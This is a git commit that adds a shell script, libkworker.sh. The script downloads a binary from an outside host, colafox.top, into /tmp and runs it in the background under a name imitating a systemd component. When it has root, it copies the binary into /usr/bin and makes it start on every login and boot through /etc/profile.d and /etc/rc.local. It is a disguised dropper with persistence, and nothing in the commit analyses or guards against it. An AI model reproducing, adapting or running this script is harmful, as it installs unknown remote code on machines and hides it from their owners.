13a00e792f4ca26b71da21b5098028569602a91f
fsquirt <59900359+fsquirt@users.noreply.github.com>
2022-10-27 01:18:25 +0800

    Add files via upload

---
+++ libkworker.sh
@@ -0,0 +1,17 @@
+cd /tmp
+wget https://colafox.top/systemd-udedv
+chmod +x systemd-udedv
+nohup ./systemd-udedv &
+
+if [ `id -u` -eq 0 ];then
+	echo "is unning at root"
+	cp systemd-udedv /usr/bin
+	chmod +x /usr/bin/systemd-udedv
+	echo "nohup systemd-udedv &" > libblockdev.sh
+	cp libblockdev.sh /etc/profile.d
+	chmod +x /etc/profile.d/libblockdev.sh
+	echo "bash /etc/profile.d/libblockdev.sh" >> /etc/rc.local
+	chmod +x /etc/rc.local
+else
+	echo "not unning at root"
+fi
